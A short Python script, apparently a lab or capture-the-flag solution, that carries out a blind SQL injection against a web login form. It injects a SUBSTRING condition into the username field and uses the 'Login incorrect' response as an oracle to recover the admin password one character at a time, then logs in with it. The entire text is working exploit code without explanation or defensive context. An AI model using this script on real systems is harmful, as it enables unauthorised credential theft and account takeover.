import requests

# URL of the website
base_url = 'https://...'

# strings
characters = '0123456789abcdefghij...'
username = 'admin" AND SUBSTRING(password, 1, '
username_middle = ') = "'
username_end = '" --'
password = ''

# Loop through all combinations until password is found

with requests.Session() as s:

    for i in range(1, 33):

        for char in characters:

            guess = username + str(i) + username_middle + password + char + username_end

            data = {
                'user': guess,
                'pw': password
            }

            response = s.post(base_url, data)

            if "Login incorrect" not in response.text:

                password += char
                break

    data = {
        'user': 'admin',
        'pw': password
    }
    response = s.post(base_url, data)
    print(response.text)
